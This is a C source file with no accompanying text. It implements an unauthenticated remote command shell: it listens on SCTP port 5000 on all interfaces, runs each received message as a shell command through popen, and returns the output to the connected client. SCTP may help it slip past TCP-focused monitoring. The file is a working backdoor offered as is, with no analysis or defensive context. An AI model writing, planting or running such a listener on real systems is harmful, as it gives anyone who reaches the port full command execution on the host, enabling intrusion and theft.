#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/sctp.h>
#define PORT 5000
#define BUFSIZE 4096

int main() {
    int listen_sock, conn_sock;
    struct sockaddr_in servaddr;
    char buffer[BUFSIZE];
    listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (listen_sock < 0) {
        perror("socket");
        exit(1);
    }
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(PORT);
    servaddr.sin_addr.s_addr = INADDR_ANY;
    if (bind(listen_sock, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        perror("bind");
        close(listen_sock);
        exit(1);
    }
    if (listen(listen_sock, 5) < 0) {
        perror("listen");
        close(listen_sock);
        exit(1);
    }
    printf("[*] Listening on SCTP port %d...\n", PORT);
    conn_sock = accept(listen_sock, NULL, NULL);
    if (conn_sock < 0) {
        perror("accept");
        close(listen_sock);
        exit(1);
    }
    printf("[*] Connection accepted.\n");
    while (1) {
        memset(buffer, 0, BUFSIZE);
        int n = sctp_recvmsg(conn_sock, buffer, BUFSIZE, NULL, 0, 0, 0);
        if (n <= 0) break;
        printf("[>] Received command: %s\n", buffer);
        FILE *fp = popen(buffer, "r");
        if (!fp) {
            char *err = "Failed to run command\n";
            sctp_sendmsg(conn_sock, err, strlen(err), NULL, 0, 0, 0, 0, 0, 0);
            continue;
        }
        while (fgets(buffer, BUFSIZE, fp) != NULL) {
            sctp_sendmsg(conn_sock, buffer, strlen(buffer), NULL, 0, 0, 0, 0, 0, 0);
        }
        pclose(fp);
    }
    close(conn_sock);
    close(listen_sock);
    return 0;
}
